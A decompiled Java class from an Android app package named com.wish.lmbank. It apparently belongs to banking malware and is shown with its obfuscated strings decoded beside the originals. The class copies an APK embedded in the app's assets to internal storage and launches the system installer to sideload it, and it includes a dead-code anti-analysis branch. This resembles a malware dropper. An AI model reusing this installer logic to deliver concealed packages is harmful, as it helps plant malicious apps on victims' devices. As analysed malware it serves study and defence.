package com.wish.lmbank.utils;

import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;

import androidx.core.content.FileProvider;

import com.wish.lmbank.base.BaseActivityV;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/utils/ApkInstallerAsyncTask.class */
public class ApkInstallerAsyncTask extends AsyncTask<Object, Void, Void> {
    private final Context context;

    public ApkInstallerAsyncTask(Context context) {
        this.context = context;
    }

    private void installApk(String str, int i) {
        try {
//             Intent intent = new Intent(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRz8gLD4"));
            Intent intent = new Intent("android.intent.action.VIEW");
            StringBuilder sb = new StringBuilder();
            sb.append(this.context.getFilesDir());
//             sb.append(bb7d7pu7.m5998("Rg"));
            sb.append("/");
            sb.append(str);
            File file = new File(sb.toString());
            if (file.exists()) {
//                 intent.setDataAndType(getUri(this.context, file), bb7d7pu7.m5998("CBkZBQAKCB0ABgdGHwcNRwgHDRsGAA1HGQgKAggODEQIGwoBAB8M"));
                intent.setDataAndType(getUri(this.context, file), "application/vnd.android.package-archive");
                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                BaseActivityV.VJBaseActivity.startActivityForResult(intent, i);
                return;
            }
            return;
        } catch (ActivityNotFoundException e) {
            StringBuilder sb2 = new StringBuilder();
//             sb2.append(bb7d7pu7.m5998("AAcaHQgFBUkMEQoMGR0ABgdT"));
            sb2.append("install exception:");
            sb2.append(e.getMessage());
            return;
        }
    }

    private Uri getUri(Context context, File file) {
        if (Build.VERSION.SDK_INT >= 24) {
//             return FileProvider.getUriForFile(context, bb7d7pu7.m5998("CgYERwUERx8ABxoGB0cZGwYfAA0MGw"), file);
            return FileProvider.getUriForFile(context, "com.lm.vinson.provider", file);
        }
        return Uri.fromFile(file);
    }

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // android.os.AsyncTask
    public Void doInBackground(Object... objArr) {
        try {
            String str = (String) objArr[0];
            int intValue = ((Integer) objArr[1]).intValue();
            copyApk(str);
            installApk(str, intValue);
            return null;
        } catch (Exception e) {
            StringBuilder sb = new StringBuilder();
//             sb.append(bb7d7pu7.m5998("DQYgBysICgIOGwYcBw1JDBEKDBkdAAYHUw"));
            sb.append("doInBackground exception:");
            sb.append(e.getMessage());
            return null;
        }
    }

    public void copyApk(String str) {
        if (((-8470) - 2059) % (-2059) > 0) {
            int i = 16796 + 16796 + 1524;
            while (true) {
            }
        } else {
            try {
                InputStream open = this.context.getAssets().open(str);
                StringBuilder sb = new StringBuilder();
                sb.append(this.context.getFilesDir());
//                 sb.append(bb7d7pu7.m5998("Rg"));
                sb.append("/");
                sb.append(str);
                File file = new File(sb.toString());
                file.createNewFile();
                FileOutputStream fileOutputStream = new FileOutputStream(file);
                byte[] bArr = new byte[1024];
                while (true) {
                    int read = open.read(bArr);
                    if (read != -1) {
                        fileOutputStream.write(bArr, 0, read);
                        fileOutputStream.flush();
                    } else {
                        fileOutputStream.close();
                        open.close();
                        return;
                    }
                }
            } catch (IOException e) {
                StringBuilder sb2 = new StringBuilder();
//                 sb2.append(bb7d7pu7.m5998("GwwIDUkMEQoMGR0ABgdT"));
                sb2.append("read exception:");
                sb2.append(e.getMessage());
            }
        }
    }
}
